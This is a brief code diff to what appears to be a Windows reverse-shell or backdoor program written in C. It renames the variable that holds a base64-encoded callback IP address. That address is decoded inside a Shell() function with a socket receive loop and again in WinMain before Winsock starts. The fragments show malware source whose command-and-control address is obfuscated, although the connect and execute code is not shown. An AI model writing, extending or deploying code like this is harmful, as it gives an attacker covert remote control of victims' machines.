@@ -15,7 +15,7 @@
 #define BUFFER_SIZE 8192
 
 int sock;
-char ip_encoded[] = "MTkyLjE2OC4xLjg=";
+char ip_[] = "MTkyLjE2OC4xLjg=";
 
 char* base64_decode(const char *input) {
     char *output;
@@ -247,7 +247,7 @@ void Shell() {
     char container[1024];
     char total_response[18384];
     int bytes_received;
-    char *ip = base64_decode(ip_encoded);
+    char *ip = base64_decode(ip_);
 
     while (1) {
         bytes_received = recv(sock, buffer, 1, MSG_PEEK);
@@ -354,7 +354,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
     struct sockaddr_in ServAddr;
     WSADATA wsaData;
-    char *ip = base64_decode(ip_encoded);
+    char *ip = base64_decode(ip_);
 
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
         exit(1);
